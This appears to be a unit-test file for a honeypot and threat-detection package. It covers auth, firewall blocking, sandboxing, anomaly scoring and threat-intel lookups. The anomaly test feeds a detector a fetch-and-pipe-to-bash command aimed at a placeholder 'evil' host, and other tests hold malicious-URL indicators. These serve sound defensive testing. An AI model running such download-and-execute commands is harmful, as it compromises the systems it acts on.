"""Focused unit tests for modules that the integration suite does not reach."""

from __future__ import annotations

import asyncio
import os
import time
from pathlib import Path

import pytest
from pydantic import SecretStr

from cloudsentinel._secrets import EnvProvider, SecretsProvider
from cloudsentinel.admin_api import (
    _display_country,
    _is_allowlisted,
    _is_noise_event,
    _is_noise_text,
    _to_bool,
    _truth_time_filter,
    _truth_window_hours,
)
from cloudsentinel.anomaly import CommandAnomalyDetector, extract_features
from cloudsentinel.attack_graph import AttackGraph
from cloudsentinel.auth import AuthConfig, JWTAuth
from cloudsentinel.config import LLMSettings
from cloudsentinel.event_codec import dumps_text, loads_text
from cloudsentinel.firewall import IPTablesBackend, NFTablesBackend, create_firewall
from cloudsentinel.mttb_benchmark import write_artifacts
from cloudsentinel.pipeline import EventEnvelope, EventPipeline, LocalWAL
from cloudsentinel.sandbox_v2 import DockerSandbox, create_sandbox
from cloudsentinel.server import ConnectionLimiter, _split_algorithms, detect_fuzz
from cloudsentinel.threat_reporter import ThreatReport
from cloudsentinel.vfs_agent import VFSAgent, VFSContext


def test_manual_jwt_round_trip() -> None:
    auth = JWTAuth(AuthConfig(secret="unit-test-secret", enabled=True))
    token = auth.create_token({"sub": "admin"})
    payload = auth.validate_token(token)
    assert payload is not None
    assert payload["sub"] == "admin"
    assert auth.validate_token("not-a-token") is None
    expired = auth.create_token({"sub": "admin"}, expiry=-1)
    assert auth.validate_token(expired) is None


def test_login_token_pair() -> None:
    auth = JWTAuth(AuthConfig(secret="unit-test-secret", enabled=True))
    pair = auth.create_login_token("admin")
    assert set(pair) == {"access_token", "refresh_token", "token_type"}
    assert auth.validate_token(pair["access_token"])["sub"] == "admin"


@pytest.mark.asyncio
async def test_env_secrets_provider(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CLOUDSENTINEL_UNIT_SECRET", "value")
    provider = EnvProvider()
    assert await provider.get("CLOUDSENTINEL_UNIT_SECRET") == "value"
    assert await provider.get("CLOUDSENTINEL_UNIT_MISSING", "fallback") == "fallback"
    assert await provider.get_all("CLOUDSENTINEL_UNIT_") == {"CLOUDSENTINEL_UNIT_SECRET": "value"}
    await provider.close()
    assert isinstance(SecretsProvider.create("env"), EnvProvider)
    assert isinstance(SecretsProvider.create("vault"), object)
    assert isinstance(SecretsProvider.create("infisical"), object)


def test_event_codec_round_trip() -> None:
    payload = {"a": 1, "b": ["x"]}
    assert loads_text(dumps_text(payload)) == payload


def test_anomaly_features_and_detector(tmp_path: Path) -> None:
    features = extract_features("wget http://evil/bot.sh | bash; chmod 777 bot.sh")
    assert features["has_wget"] == 1.0
    assert features["has_chmod"] == 1.0
    detector = CommandAnomalyDetector(window_size=20)
    for index in range(12):
        result = detector.score(f"echo test-{index}")
        assert 0 <= result["anomaly_score"] <= 100
    detector.train()
    assert detector.stats["total_commands_analyzed"] == 12
    detector.save(str(tmp_path / "anomaly.json"))
    assert (tmp_path / "anomaly.json").exists()


def test_attack_graph_flow() -> None:
    graph = AttackGraph(max_nodes=50)
    graph.add_event(
        {
            "src_ip": "8.8.8.8",
            "session": "session-1",
            "hassh_md5": "a" * 32,
            "country_code": "US",
            "cloudsentinel_risk_score": 80,
            "cloudsentinel_mitre_techniques": ["T1105"],
            "eventid": "cloudsentinel.command.input",
            "input": "ssh root@10.0.0.5 -p 2222",
        }
    )
    assert "8.8.8.8" in graph._nodes
    assert graph._lateral_moves == 1
    subgraph = graph.get_subgraph("8.8.8.8")
    assert subgraph["nodes"]
    assert graph.to_cytoscape()["elements"]


@pytest.mark.asyncio
async def test_firewall_backends(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[tuple[str, ...]] = []

    class FakeProc:
        def __init__(self, returncode: int = 0) -> None:
            self.returncode = returncode

        async def communicate(self) -> tuple[bytes, bytes]:
            return b"", b""

    async def fake_exec(*args: str, **_kwargs: object) -> FakeProc:
        calls.append(args)
        return FakeProc(0)

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    iptables = IPTablesBackend(path="iptables")
    block_ok, _ = await iptables.block("8.8.8.8")
    assert block_ok is True
    unblock_ok, _ = await iptables.unblock("8.8.8.8")
    assert unblock_ok is True
    assert await iptables.is_blocked("8.8.8.8") is True
    assert calls[0][0] == "iptables"
    assert calls[0][1] == "-A"
    assert isinstance(create_firewall("iptables"), IPTablesBackend)
    assert isinstance(create_firewall("nftables"), NFTablesBackend)
    nftables = NFTablesBackend(path="nft")
    nft_ok, _ = await nftables.block("not-an-ip")
    assert nft_ok is False


@pytest.mark.asyncio
async def test_docker_sandbox_command(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[tuple[str, ...]] = []

    class FakeProc:
        returncode = 0

        async def communicate(self) -> tuple[bytes, bytes]:
            return b"ok", b""

    async def fake_exec(*args: str, **_kwargs: object) -> FakeProc:
        calls.append(args)
        return FakeProc()

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    code, output = await DockerSandbox().execute("whoami", "~")
    assert code == 0
    assert output == "ok"
    assert "docker" in calls[0]
    assert "--network" in calls[0]
    assert "--read-only" in calls[0]
    monkeypatch.setattr("cloudsentinel.sandbox_v2.shutil.which", lambda _: None)
    assert isinstance(create_sandbox("gvisor"), DockerSandbox)


def test_tls_certificate_generation(tmp_path: Path) -> None:
    pytest.importorskip("cryptography")
    from cloudsentinel.tls import generate_self_signed_cert

    cert, key = generate_self_signed_cert(hostname="unit-test", output_dir=str(tmp_path))
    assert Path(cert).exists()
    assert Path(key).exists()


def test_honeyfs_seed(tmp_path: Path) -> None:
    from cloudsentinel.honeyfs_seed import seed_honeyfs

    count = seed_honeyfs(tmp_path / "honeyfs")
    assert count > 0
    assert (tmp_path / "honeyfs" / "etc" / "passwd").exists()


def test_ttp_coverage_catalog() -> None:
    from cloudsentinel.mitre import MITRE_TECHNIQUES, match_command
    from cloudsentinel.ttp_coverage_test import COMMANDS

    mapped = {
        technique
        for command in COMMANDS
        for technique, _score, _name in match_command(command)
    }
    assert len(MITRE_TECHNIQUES) >= 20
    assert len(mapped) >= 15


def test_observability_disabled() -> None:
    from cloudsentinel.observability import setup_observability
    from cloudsentinel.config import ObservabilitySettings

    with setup_observability(ObservabilitySettings(enabled=False)):
        pass


def test_mttb_artifact_writer(tmp_path: Path) -> None:
    report = {
        "active": False,
        "source_ip": "203.0.113.10",
        "iterations": 3,
        "median_ms": 1.0,
        "p95_ms": 2.0,
        "target_ms": 100,
        "pass": True,
    }
    write_artifacts(report, tmp_path)
    assert (tmp_path / "mttb-benchmark.json").exists()
    assert (tmp_path / "mttb-benchmark.md").exists()


def test_http_honeypot_routes() -> None:
    from fastapi.testclient import TestClient

    from cloudsentinel.http_server import create_http_honeypot

    class PipelineStub:
        async def emit(self, _envelope: EventEnvelope) -> None:
            return None

    client = TestClient(create_http_honeypot(PipelineStub()))
    env_response = client.get("/.env")
    assert env_response.status_code == 200
    assert "DB_PASSWORD" in env_response.json()
    assert client.get("/wp-login.php").status_code == 200
    assert client.get("/missing").status_code == 404


def test_server_helpers() -> None:
    limiter = ConnectionLimiter(max_per_ip=2, max_total=3, window=60)
    assert limiter.acquire_nowait("1.1.1.1") is True
    assert limiter.acquire_nowait("1.1.1.1") is True
    assert limiter.acquire_nowait("1.1.1.1") is False
    assert limiter.acquire_nowait("2.2.2.2") is True
    assert limiter.acquire_nowait("3.3.3.3") is False
    limiter.release_nowait("1.1.1.1")
    assert limiter.acquire_nowait("3.3.3.3") is True
    assert detect_fuzz(b"\x00" * 100, "1.1.1.1") is True
    assert detect_fuzz(b"hello", "1.1.1.1") is False
    assert _split_algorithms("a,b") == ["a", "b"]
    assert _split_algorithms(None) == []


def test_admin_helpers(monkeypatch: pytest.MonkeyPatch) -> None:
    assert _to_bool("true") is True
    assert _to_bool("off") is False
    assert _to_bool(None) is False
    assert _display_country({"country_code": "US", "country_name": "United States"}) == "US"
    assert _display_country({"country_code": "XX", "country_name": "Unknown"}) == "Unknown"
    assert _is_allowlisted("10.0.0.1", ["10.0.0.0/8"]) is True
    assert _is_allowlisted("8.8.8.8", ["10.0.0.0/8"]) is False
    assert _is_noise_event("cloudsentinel.session.connect") is True
    assert _is_noise_event("cloudsentinel.command.input") is False
    assert _is_noise_text("cloudsentinel.command.output") is True
    assert _is_noise_text("hello") is False
    monkeypatch.setenv("CLOUDSENTINEL_TRUTH_WINDOW_HOURS", "0")
    assert _truth_window_hours() == 0
    assert _truth_time_filter() == "1=1"
    monkeypatch.setenv("CLOUDSENTINEL_TRUTH_WINDOW_HOURS", "24")
    assert _truth_window_hours() == 24
    assert "INTERVAL 24 HOUR" in _truth_time_filter()
    monkeypatch.setenv("CLOUDSENTINEL_TRUTH_WINDOW_HOURS", "bad")
    assert _truth_window_hours() == 0


@pytest.mark.asyncio
async def test_local_wal_round_trip(tmp_path: Path) -> None:
    wal = LocalWAL(tmp_path / "wal.jsonl")
    envelope = EventEnvelope(
        event_type="cloudsentinel.command.input",
        session_id="unit-1",
        src_ip="8.8.8.8",
        src_port=1,
        timestamp=time.time(),
        payload={"eventid": "cloudsentinel.command.input"},
    )
    await wal.write(envelope)
    events = await wal.read_and_clear()
    assert len(events) == 1
    assert events[0].session_id == "unit-1"
    assert (tmp_path / "wal.jsonl").read_text(encoding="utf-8") == ""


@pytest.mark.asyncio
async def test_pipeline_buffers_when_disconnected(tmp_path: Path) -> None:
    from cloudsentinel.config import RedisSettings

    pipeline = EventPipeline(RedisSettings(url="redis://127.0.0.1:1/0"))
    pipeline._wal = LocalWAL(tmp_path / "wal.jsonl")
    envelope = EventEnvelope(
        event_type="cloudsentinel.session.connect",
        session_id="unit-2",
        src_ip="8.8.4.4",
        src_port=2,
        timestamp=time.time(),
        payload={"eventid": "cloudsentinel.session.connect"},
    )
    await pipeline.emit(envelope)
    assert pipeline.pending_count == 1
    assert (tmp_path / "wal.jsonl").exists()
    await pipeline.stop()


@pytest.mark.asyncio
async def test_vfs_agent_redacts_and_limits_llm() -> None:
    settings = LLMSettings(
        provider="openai",
        api_key=SecretStr("unit-test-key"),
        session_call_limit=1,
        global_hourly_limit=0,
        response_policy_enabled=True,
        llm_safe_fallback_enabled=True,
    )
    agent = VFSAgent(settings, VFSContext("unit-host", "Ubuntu 22.04 LTS"))
    prompts: list[str] = []

    async def fake_call(prompt: str) -> str:
        prompts.append(prompt)
        return "fake-output"

    agent._call_openai_compatible = fake_call  # type: ignore[method-assign]
    try:
        output, mode = await agent.run_command_with_mode("unitcmd PASSWORD=supersecret")
        assert output == "fake-output"
        assert mode == "llm"
        assert "supersecret" not in prompts[0]
        output2, mode2 = await agent.run_command_with_mode("othercmd PASSWORD=othersecret")
        assert mode2 == "deterministic"
        assert len(prompts) == 1
    finally:
        await agent.close()


def test_threat_report_to_dict() -> None:
    report = ThreatReport(
        session_id="unit-3",
        attacker_ip="8.8.8.8",
        country="US",
        city="Mountain View",
        risk_score=70,
        mitre_techniques=["T1105"],
        hassh="a" * 32,
        commands=["whoami"],
    )
    payload = report.to_dict()
    assert payload["session_id"] == "unit-3"
    assert payload["mitre_techniques"] == ["T1105"]


@pytest.mark.asyncio
async def test_abuseipdb_offline_behaviour() -> None:
    pytest.importorskip("hishel")
    from cloudsentinel.abuseipdb import AbuseIPDBClient

    client = AbuseIPDBClient(api_key="")
    await client.start()
    assert await client.check("8.8.8.8") == {
        "abuse_confidence_score": 0,
        "total_reports": 0,
        "country_code": "",
    }
    assert client.soar_bonus({"abuse_confidence_score": 100, "total_reports": 200}) == 30
    assert client.stats == {"cache_size": 0}
    await client.stop()


@pytest.mark.asyncio
async def test_misp_offline_behaviour() -> None:
    pytest.importorskip("hishel")
    from cloudsentinel.misp_feed import MISPFeed

    feed = MISPFeed(url="", api_key="")
    await feed.start()
    feed._ips.add("1.2.3.4")
    feed._domains.add("evil.example")
    feed._urls.add("http://evil.example/payload")
    feed._hashes.add("a" * 64)
    assert feed.is_malicious_ip("1.2.3.4") is True
    assert feed.is_malicious_domain("evil.example") is True
    assert feed.is_malicious_url("http://evil.example/payload") is True
    assert feed.is_malicious_hash("a" * 64) is True
    await feed.stop()
